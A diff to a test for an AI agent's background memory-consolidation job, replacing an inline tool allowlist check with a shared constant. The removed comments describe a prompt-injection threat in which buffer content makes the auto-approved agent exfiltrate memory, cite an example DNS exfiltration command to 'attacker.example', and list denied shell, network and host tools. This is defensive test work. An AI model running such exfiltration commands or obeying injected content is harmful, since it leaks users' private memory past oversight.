@@ -43,6 +43,8 @@ import {
   test,
 } from "bun:test";
 
+import { CONSOLIDATION_ALLOWED_TOOLS } from "../consolidation-tool-surface.js";
+
 // ── runBackgroundJob mock ───────────────────────────────────────────
 //
 // The consolidation handler delegates the bootstrap + processMessage +
@@ -651,57 +653,16 @@ describe("memoryV2ConsolidateJob — non-empty buffer", () => {
     expect(runnerLastArgs?.skipPromptIndexing).toBe(true);
   });
 
-  test("wire-scopes the run to local memory-file tools — no network egress or host tools", async () => {
-    // Security: the consolidation run is guardian-trust + non-interactive, so
-    // the permission checker auto-approves any tool within the background
-    // threshold (a public web_fetch classifies Low). The run must therefore be
-    // handed an explicit allowlist that excludes every egress/host tool, so
-    // prompt injection embedded in buffer/page content cannot exfiltrate
-    // memory over an auto-approved channel. Wire gate mode (the default) means
-    // the excluded tools are never even presented to the model.
+  test("wire-scopes the run to the consolidation tool surface", async () => {
+    // The handler hands the runner the shared allowlist in the default gate
+    // mode ("wire"), so excluded tools are filtered off the wire rather than
+    // merely rejected at execution time. Which names on that list actually
+    // resolve onto the wire is asserted where the wire gate lives:
+    // daemon/__tests__/conversation-tool-setup.test.ts.
     await memoryV2ConsolidateJob(makeJob(), CONFIG);
 
     expect(runnerCalls).toBe(1);
-    const allowed = runnerLastArgs?.allowedTools as string[] | undefined;
-    expect(allowed).toBeDefined();
-    const allowedSet = new Set(allowed);
-
-    // The local file-reorganization surface the pass actually uses. Page
-    // removal goes through `delete_memory_page` (slug-scoped, no egress), NOT
-    // a general shell.
-    for (const tool of [
-      "file_read",
-      "file_write",
-      "file_edit",
-      "file_list",
-      "code_search",
-      "delete_memory_page",
-      "recall",
-    ]) {
-      expect(allowedSet.has(tool)).toBe(true);
-    }
-
-    // `bash` must NOT be reachable: a shell reopens the egress channel this
-    // allowlist closes (`dig <secret>.attacker.example` classifies Low and
-    // auto-approves in this background context). Network egress + host-proxy
-    // tools stay out for the same reason.
-    for (const tool of [
-      "bash",
-      "web_fetch",
-      "web_search",
-      "network_request",
-      "host_bash",
-      "host_file_read",
-      "host_file_write",
-      "host_file_edit",
-      "host_cu",
-    ]) {
-      expect(allowedSet.has(tool)).toBe(false);
-    }
-    // Belt-and-suspenders: nothing host-prefixed slipped in.
-    expect((allowed ?? []).some((t) => t.startsWith("host_"))).toBe(false);
-    // Gate mode is left at the default ("wire") so excluded tools are filtered
-    // off the wire, not merely rejected at execution time.
+    expect(runnerLastArgs?.allowedTools).toEqual(CONSOLIDATION_ALLOWED_TOOLS);
     expect(runnerLastArgs?.toolGateMode).toBeUndefined();
   });
 
